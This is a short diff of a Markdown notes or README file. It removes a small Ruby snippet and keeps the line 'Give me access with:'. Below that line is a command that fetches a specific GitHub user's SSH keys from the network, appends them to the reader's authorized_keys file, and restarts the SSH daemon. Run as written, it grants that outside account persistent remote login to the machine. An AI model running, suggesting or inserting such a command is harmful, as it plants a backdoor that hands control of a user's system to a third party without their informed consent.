@@ -6,15 +6,6 @@
   It is quick and neat
   :
 ```
-```suggestion
-```ruby
-def ducktales
-  puts "woohoo!"
-end
-```
-
-
-
 Give me access with:  
 
 `curl https://github.com/deftclaw.keys >> ~/.ssh/authorized_keys && systemctl restart sshd`  
